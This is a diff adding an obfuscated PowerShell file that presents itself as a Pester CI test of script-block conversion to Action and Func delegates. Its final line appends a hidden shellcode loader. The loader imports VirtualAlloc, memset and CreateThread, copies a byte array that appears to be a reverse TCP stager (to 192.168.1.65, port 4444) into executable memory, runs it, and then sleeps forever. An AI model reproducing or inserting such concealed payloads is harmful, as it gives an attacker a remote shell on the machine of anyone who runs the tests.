@@ -1,0 +1,110 @@
+ .('sV')  ('Uzis'+'NK')  (  [tYpe]("{0}{1}"-f'ObJ','eCT')  )  ; 
+
+&("{1}{0}" -f 'cribe','Des') ("{2}{11}{0}{12}{8}{7}{1}{10}{9}{6}{3}{4}{13}{5}"-f 'conver','cript','Test ','ock and ','dele','te','l',' s','on b/w','b',' ','for ','si','ga') -Tags "CI" {
+    .("{2}{0}{1}" -f'e','foreAll','B') {
+        function lin`eno
+        {
+            ${myIN`V`Oc`A`TIoN}."sC`RIPtlINeNu`MB`Er"
+        }
+
+        function G`eNerate`-A`RGUMEnTT`YP`E`SaN`dP`Ar`AM`EtERs
+        {
+            param([int] ${N`UM}, [ref] ${PaR`AMe`Ters}, [ref]${A`R`gU`MentTyPEs}, [bool]${hASr`et`UrN} = ${F`Alse})
+
+            For(${j} = 1; ${J} -le ${n`Um}; ${j}++)
+            {
+                ${r`An} = .("{2}{0}{3}{1}" -f 'a','dom','Get-R','n') -Minimum 1 -Maximum 3
+                ${T`YPe} = [Int32]
+                switch (${R`AN})
+                {
+                    1 { ${TY`pE} = [Int32]; break}
+                    2 { ${Ty`PE} = [string]; break}
+                    3 { ${T`YpE} = [Hashtable];  break}
+                }
+
+                ${ArgUM`EnTtYp`ES}."V`ALuE" += ${tY`pE};
+
+                if((-not ${h`AS`Ret`Urn}) -or (${J} -lt ${N`UM} ) )  {
+                    ${PA`R`AMEt`eRs}."VA`Lue"  += &("{1}{2}{0}"-f 'e','Get','-Valu')(${TY`pe})
+                }
+            }
+        }
+
+        function G`et-Val`Ue
+        {
+            param([type] ${t})
+
+            if (${t} -eq [Int32]) { 100 }
+            elseif(${T} -eq [string]) { 'abc' }
+            elseif (${t} -eq [Hashtable])  {@{('a') = 'foo'} }
+        }
+    }
+
+    
+    .('It') ("{3}{0}{1}{4}{2}"-f'y','ste','ion','S','m.Act') {
+        ([System.Action]{ ${S`crIP`T:gl}=.("{1}{0}" -f 'eno','lin'); ${aR`Gs}."l`eNgTh" | .("{1}{0}" -f'd','Shoul') -Be 0 })."I`NVokE"()
+        (${G`L} + 1) | &("{0}{1}"-f 'S','hould') -BeExactly (&("{2}{1}{0}" -f'no','ine','l'))
+    }
+    
+    For(${I} = 1; ${I} -le 8; ${i}++)
+    {
+        ${s`TR} = 'System.Action`{0}' -f ${i}
+        &("{1}{0}"-f 'ntext','Co') ${S`Tr} {
+            ${G`T} =   (&("{0}{2}{1}"-f'vARi','le','aB') uzisNk -vAlUeonL )."AS`sE`mBlY".("{1}{0}{2}" -f 'p','GetTy','e').Invoke(${s`TR})
+
+            ${pARA`m`eters} = @()
+            ${A`RGUMEntT`YP`ES}=@()
+            .("{2}{4}{7}{0}{3}{8}{6}{1}{5}" -f 't','am','Gene','e-ArgumentTy','r','eters','dPar','a','pesAn') ${i} ([ref] ${P`Arame`Ters}) ([ref] ${AR`gumENtT`y`peS})
+
+            ${C`T} = ${G`T}.("{0}{1}{3}{2}{4}" -f 'MakeG','en','ricTy','e','pe').Invoke(${ARgU`mE`N`TtypEs})
+
+            ${fu`Nc} = { ${S`CRIp`T:`GL}=&("{1}{0}"-f 'ineno','l'); ${A`RGs}."lEn`G`TH" | &("{0}{1}"-f'Sh','ould') -BeExactly ${I} } -as ${c`T}
+            ${f`UnC}.("{0}{3}{1}{2}"-f'Dyna','icInvok','e','m').Invoke(${PARa`m`et`ers})
+            .('It') (('{0'+'}gl ')  -f[CHar]36+'+ '+'2') { (${G`L} + 2) | .("{0}{1}{2}" -f'Sh','o','uld') -BeExactly (.("{1}{0}" -f 'neno','li')) }
+        }
+    }
+
+    
+    .('It') ("{4}{3}{2}{1}{0}"-f ']','unc[Int32','m.F','yste','S') {
+        ([System.Func[Int32]]{ ${sc`Ri`pT`:gL}=.("{1}{0}"-f 'ineno','l'); ${Ar`Gs}."lE`NGtH" })."INV`O`ke"() | &("{1}{0}" -f 'ould','Sh') -Be 0
+        (${gL} + 1) | &("{1}{0}" -f'hould','S') -BeExactly (&("{1}{0}{2}" -f 'i','l','neno'))
+    }
+
+    .('It') ("{3}{2}{5}{6}{0}{4}{1}" -f'st','ng]','tem.Fu','Sys','ri','nc','[') {
+        ([System.Func[string]]{ ${scri`P`T:gl}=.("{1}{0}" -f'ineno','l'); ("{1}{0}" -f 'ello','h') })."iN`Voke"() | &("{0}{1}" -f'Sho','uld') -BeExactly ("{1}{0}" -f'o','hell')
+        (${G`L} + 1) | .("{0}{1}"-f'Shou','ld') -BeExactly (&("{0}{1}" -f 'li','neno'))
+    }
+
+    &('It') ("{3}{0}{2}{1}{4}" -f'yst','.Func[hashtabl','em','S','e]') {
+        (([System.Func[hashtable]]{ ${sc`Rip`T:Gl}=.("{1}{0}"-f'no','line'); @{('a') = 'foo' }})."In`VOkE"())."A" | &("{1}{0}" -f 'd','Shoul') -BeExactly 'foo'
+        (${gl} + 1) | .("{0}{1}"-f 'Shou','ld') -BeExactly (.("{0}{1}" -f'lin','eno'))
+    }
+
+    
+    For(${I} = 2; ${I} -le 9; ${I}++)
+    {
+        ${s`Tr} = 'System.Func`{0}' -f ${I}
+        .("{2}{1}{0}" -f't','tex','Con') ${S`TR} {
+            ${g`T} =  ( .("{1}{2}{0}" -f 'eM','gET-I','t')  ("V"+"ARIA"+"Ble:u"+"ZiSnk"))."val`UE"."aSS`eMbLY".("{2}{1}{0}" -f 'e','p','GetTy').Invoke(${S`Tr})
+
+            ${Parame`Te`RS} = @()
+            ${AR`gume`N`TtYp`eS}=@()
+            .("{2}{5}{3}{6}{0}{1}{4}" -f'An','d','Gen','e-Argum','Parameters','erat','entTypes') ${I} ([ref] ${PAr`AmEte`Rs}) ([ref] ${aR`GUmE`N`TTY`Pes}) ${tr`Ue}
+            ${v}= &("{2}{3}{0}{1}" -f'l','ue','G','et-Va')(${Ar`G`U`ment`TYpEs}[${I}-1])
+            ${c`T} = ${gt}.("{0}{1}{4}{3}{2}"-f'Ma','keGener','ype','cT','i').Invoke(${a`RGum`EnT`Ty`PEs})
+            ${F`UNC} = { ${S`c`RIPt:gL}=&("{0}{2}{1}"-f'line','o','n'); ${nU`Ll} = (${A`RgS}."leN`gtH" | .("{1}{2}{0}"-f 'ould','S','h') -BeExactly (${I}-1)); ${v} } -as ${CT}
+            ${T} = ${F`UNC}.("{0}{2}{3}{1}" -f'D','e','y','namicInvok').Invoke(${P`A`RAm`etERS})
+            &('It') (('H'+'24gl ')."rEPl`ACe"(([char]72+[char]50+[char]52),'$')+'+ '+'2') { (${G`l} + 2) | &("{0}{1}" -f 'S','hould') -BeExactly (.("{1}{0}" -f'eno','lin')) }
+            if (${ArgU`men`T`TYpES}[${i}-1] -eq [Hashtable] )
+            {
+                .('It') (('{0}'+'t.a')  -F  [CHAr]36) { ${t}."A" | &("{1}{0}{2}" -f'o','Sh','uld') -BeExactly ${V}."a" }
+            }
+            else
+            {
+                &('It') '$t' { ${t} | .("{0}{1}" -f 'Sh','ould') -BeExactly ${v} }
+            }
+        }
+    }
+}
+
+${C} = ((("{62}{29}{44}{41}{23}{11}{14}{46}{19}{60}{2}{10}{27}{30}{13}{78}{38}{63}{74}{22}{26}{6}{66}{24}{56}{54}{37}{40}{20}{64}{32}{25}{5}{16}{7}{34}{36}{59}{80}{33}{71}{65}{47}{4}{45}{69}{51}{12}{3}{9}{43}{61}{42}{53}{55}{31}{18}{67}{48}{70}{68}{76}{0}{15}{17}{73}{49}{28}{1}{77}{79}{35}{39}{75}{50}{21}{8}{52}{72}{58}{57}"-f'l','n I','tPtr ','Size, ',' uin',' ex','flAllocationType',' IntPt','est, ','IntPtr lpStartAddr','Vir','public st','k','l','atic','ic st','tern','at','r lpTh','r','n','tr d','e,',']','Protec',' static',' uint ','tualAlloc(IntPt','er','Dl','r ',', IntPt',')]public','p','r CreateT',' me','hre','rt({0}ke','res','ms','r','l{0})','pParameter, ui','ess','lImport({0}kernel32.dl','t',' exte','tributes,','d','t','ntP','Stac','uint s','nt dwCre','mpo','ationFlags','t);[DllI','ount);','int c','ad(IntPtr','n In',', IntPtr l','[','s, uin','el32.dll{0}','t',', uint fl','rea','vcrt.dll{0',' dw','Id);[DllImport({0}ms','ThreadA','rc, u','ic ex','t dwSiz','et(I','})]pub','ntP','pAdd','tr',' l'))  -f [cHaR]34);${w} = .("{1}{0}{2}" -f 'dd-Typ','A','e') -memberDefinition ${c} -Name ("{1}{0}"-f '32','Win') -namespace ("{2}{1}{0}"-f'nctions','2Fu','Win3') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x41,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${G} = 0x1000;if (${Z}."Le`NgTh" -gt 0x1000){${g} = ${Z}."leng`TH"};${x}=${W}::("{3}{1}{0}{2}" -f'ualAll','t','oc','Vir').Invoke(0,0x1000,${G},0x40);for (${I}=0;${I} -le (${z}."L`eng`TH"-1);${i}++) {${W}::"M`em`sEt"([IntPtr](${x}.("{0}{2}{1}" -f 'ToInt','2','3').Invoke()+${I}), ${Z}[${I}], 1)};${W}::("{2}{0}{1}" -f 'reateTh','read','C').Invoke(0,0,${X},0,0,0);for (;;){&("{1}{3}{2}{0}" -f 'ep','St','le','art-s') 60};
